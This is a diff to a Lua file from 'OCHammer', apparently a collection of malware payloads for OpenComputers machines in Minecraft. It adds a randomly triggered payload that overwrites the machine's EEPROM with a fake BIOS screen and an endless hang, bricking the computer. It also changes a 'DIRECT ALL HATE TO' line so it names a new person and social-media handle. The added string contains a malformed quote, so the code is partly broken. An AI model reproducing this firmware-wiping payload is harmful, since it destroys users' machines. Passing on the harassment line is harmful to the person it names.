@@ -29,7 +29,7 @@ local function GREETZ()
     " ";
     "OCHammer includes payloads from malware(-s) featured in danooct1's YouTube channel. (MineOS App Store too!)";
     " ";
-    "DIRECT ALL HATE TO ELVIJS 1222 (@elvijs1222 on TikTok)"; 
+    "DIRECT ALL HATE TO KIZMO (@KizmoTek on Twitter)"; 
     " ";
     " ";
     "GREETZ: OCboy3, Chouladalls, Kurhox, SirKamilMarko";
@@ -73,7 +73,19 @@ local function GREETZ()
   end
   
   if math.random(1,math.random(20,50)) == 1 then
-    component.proxy(component.list("eeprom")()).set("local a,b=component.proxy,component.list;local c=component.proxy(b(\"gpu\")())local d,e=c.getResolution()c.setBackground(0x000000)c.setForeground(0xFFFFFF)c.fill(1,1,d,e," ")c.set(1,1,\"\")while true do computer.pullSignal(1)end")
+    component.proxy(component.list("eeprom")()).set([[local a,b=component.proxy,component.list;local c=component.proxy(b(\gpu")())local d,e=c.getResolution()c.setBackground(0x000000)c.setForeground(0xFFFFFF)c.fill(1,1,d,e," ")
+    c.set(1,1,"OPEN BELL /====/")
+    computer.beep(1000,0.5)
+    c.set(1,3,"California 80386 ROM BIOS PLUS Version 1.10 69420")
+    c.set(1,4,"Copyright (C) Unbox A Computer Software Systems Ltd.")
+    c.set(1,5,"All rights reserved.")
+    computer.beep(1000,1)
+    c.set(1,7,"DDR4-667 In Dual-Channel Mode")
+    c.set(1,8,"Initalizing HDD Controllers.. done.")
+    c.set(1,9,"412MB Extended memory (ok)")
+    computer.beep(1000,0.15)
+    c.set(1,11,"*** No bootable medium found! ***")
+    while true do computer.pullSignal(1)end]])
   end
     
   while true do
